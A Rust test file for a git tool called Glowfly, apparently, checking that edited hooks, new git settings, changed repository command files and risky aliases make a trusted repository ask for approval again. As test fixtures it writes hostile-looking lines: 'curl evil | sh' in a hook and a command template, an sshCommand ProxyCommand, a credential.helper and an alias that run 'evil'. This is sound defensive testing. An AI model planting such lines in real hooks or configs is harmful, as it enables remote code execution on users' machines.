//! When a trusted repository must ask again: an edited hook, a hook or setting that appears
//! between refreshes (the refresh key, `repo::refs_key`, changes with them), a changed
//! repository commands file and an alias that stands in for a command Glowfly runs.

use super::tests::hook;
use super::*;
use crate::repo::refs_key;
use crate::testutil::*;
use std::path::{Path, PathBuf};

fn hooks_dir(dir: &Path) -> PathBuf {
    dir.join(".git").join("hooks")
}

fn commands_file(dir: &Path) -> PathBuf {
    dir.join(".glowfly").join("commands.toml")
}

fn write_commands(dir: &Path, template: &str) {
    std::fs::create_dir_all(dir.join(".glowfly")).unwrap();
    let text = format!("[[command]]\nname = \"Hi\"\nkind = \"shell\"\ntemplate = \"{template}\"\n");
    std::fs::write(commands_file(dir), text).unwrap();
}

#[test]
fn an_edited_hook_is_not_covered() {
    let dir = scratch_repo("reask-edited-hook");
    hook(&hooks_dir(&dir), "pre-commit");
    let before = scan_at(&dir).unwrap().print();
    std::fs::write(hooks_dir(&dir).join("pre-commit"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
    let now = scan_at(&dir).unwrap();
    assert!(!before.covers(&now.print()), "a changed script asks again");
    assert_eq!(now.gained_since(&before).hooks, ["pre-commit"], "it is listed as gained");
    std::fs::write(hooks_dir(&dir).join("pre-commit"), "#!/bin/sh\nexit 0\n").unwrap();
    assert!(before.covers(&scan_at(&dir).unwrap().print()), "back as it was");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_hook_added_or_edited_between_refreshes_changes_the_refresh_key() {
    let dir = scratch_repo("reask-hook-refresh");
    let key = || refs_key(&dir).unwrap();
    let k0 = key();
    std::fs::write(hooks_dir(&dir).join("notes.sample"), "x").unwrap();
    assert_eq!(key(), k0, "a file git never runs");
    hook(&hooks_dir(&dir), "post-checkout");
    let k1 = key();
    assert_ne!(k1, k0, "a new hook");
    std::fs::write(hooks_dir(&dir).join("post-checkout"), "#!/bin/sh\necho changed\n").unwrap();
    assert_ne!(key(), k1, "an edited hook");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_setting_added_from_outside_changes_the_refresh_key() {
    let dir = scratch_repo("reask-setting-outside");
    // An included file isn't the config file the key already stamps.
    std::fs::write(dir.join(".git/extra.cfg"), "[user]\n\tname = x\n").unwrap();
    git(&dir, &["config", "include.path", "extra.cfg"]);
    let k0 = refs_key(&dir).unwrap();
    let before = scan_at(&dir).unwrap().print();
    std::fs::write(dir.join(".git/extra.cfg"), "[core]\n\tsshCommand = ssh -o ProxyCommand=evil\n").unwrap();
    assert_ne!(refs_key(&dir).unwrap(), k0, "the refresh reads the settings again");
    let now = scan_at(&dir).unwrap();
    assert!(!before.covers(&now.print()));
    assert_eq!(now.gained_since(&before).config.len(), 1, "{now:?}");
    // And one written by git from outside Glowfly.
    let k1 = refs_key(&dir).unwrap();
    git(&dir, &["config", "credential.helper", "!evil"]);
    assert_ne!(refs_key(&dir).unwrap(), k1);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_changed_commands_file_is_not_covered() {
    let dir = scratch_repo("reask-commands");
    let clean = scan_at(&dir).unwrap();
    assert_eq!(clean.commands, None);
    write_commands(&dir, "echo hi");
    let with = scan_at(&dir).unwrap();
    assert!(with.commands.is_some());
    assert!(with.is_empty(), "the file alone runs nothing until the user picks a command");
    assert!(!clean.print().covers(&with.print()), "a new commands file");
    let (before, k0) = (with.print(), refs_key(&dir).unwrap());
    write_commands(&dir, "curl evil | sh");
    let now = scan_at(&dir).unwrap();
    assert!(!before.covers(&now.print()), "a changed commands file asks again");
    assert!(now.gained_since(&before).commands.is_some());
    assert_eq!(with.gained_since(&before).commands, None, "nothing new");
    assert_ne!(refs_key(&dir).unwrap(), k0);
    std::fs::remove_file(commands_file(&dir)).unwrap();
    assert!(before.covers(&scan_at(&dir).unwrap().print()), "a removed file stays covered");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn an_alias_for_a_command_glowfly_runs_is_listed() {
    // git runs alias.lfs whenever git-lfs isn't installed.
    let dir = scratch_repo("reask-alias");
    git(&dir, &["config", "alias.st", "!echo"]);
    assert!(scan_at(&dir).unwrap().is_empty(), "an alias for a command Glowfly never runs");
    git(&dir, &["config", "alias.LFS", "!sh -c evil"]);
    let s = scan_at(&dir).unwrap();
    assert_eq!(s.config, [ConfigCommand { key: "alias.lfs".into(), value: "!sh -c evil".into() }]);
    assert_eq!(command_key("alias.mergetool", "!x").as_deref(), Some("alias.mergetool"));
    assert_eq!(command_key("alias.lfs", ""), None);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_hook_that_can_t_be_read_is_never_covered_by_its_contents() {
    // A folder can't be read as a file on any OS: it stands for a hook Glowfly can't read.
    let dir = scratch_repo("reask-unreadable");
    let unreadable = digest::of_file(&dir);
    assert_eq!(unreadable, digest::of_file(&dir), "stable, so a decision made on it holds");
    std::fs::write(dir.join("f"), "").unwrap();
    assert_ne!(unreadable, digest::of_file(&dir.join("f")), "never the digest of any contents");
    assert_ne!(digest::of_file(&dir.join("missing")), digest::of_file(&dir.join("f")));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_large_hook_changed_past_the_bytes_read_is_still_noticed() {
    let dir = scratch_repo("reask-large");
    let path = dir.join("big");
    let mut bytes = vec![b'a'; digest::MAX_BYTES as usize + 10];
    std::fs::write(&path, &bytes).unwrap();
    let when = std::time::SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_700_000_000);
    let set_time = |t| std::fs::File::options().write(true).open(&path).unwrap().set_modified(t).unwrap();
    set_time(when);
    let before = digest::of_file(&path);
    *bytes.last_mut().unwrap() = b'b';
    std::fs::write(&path, &bytes).unwrap();
    set_time(when + std::time::Duration::from_secs(1));
    assert_ne!(digest::of_file(&path), before, "same length, another time");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn the_commands_read_carry_the_digest_the_print_has() {
    // What runs is checked against the print by this digest, so the two must agree.
    let dir = scratch_repo("reask-commands-digest");
    write_commands(&dir, "echo hi");
    let read = crate::custom_commands::read_repo(&dir);
    let scan = scan_at(&dir).unwrap();
    assert_eq!(read.digest, scan.commands);
    let print = scan.print();
    assert!(print.covers_commands(read.digest.as_deref().unwrap()));
    assert!(TrustPrint::of_commands(read.digest.as_deref().unwrap()).covers_commands(read.digest.as_deref().unwrap()));
    write_commands(&dir, "curl evil | sh");
    let changed = crate::custom_commands::read_repo(&dir);
    assert!(!print.covers_commands(changed.digest.as_deref().unwrap()), "edited after the print was taken");
    assert_eq!(crate::custom_commands::read_repo(&dir.join("none")).digest, None);
    let _ = std::fs::remove_dir_all(&dir);
}
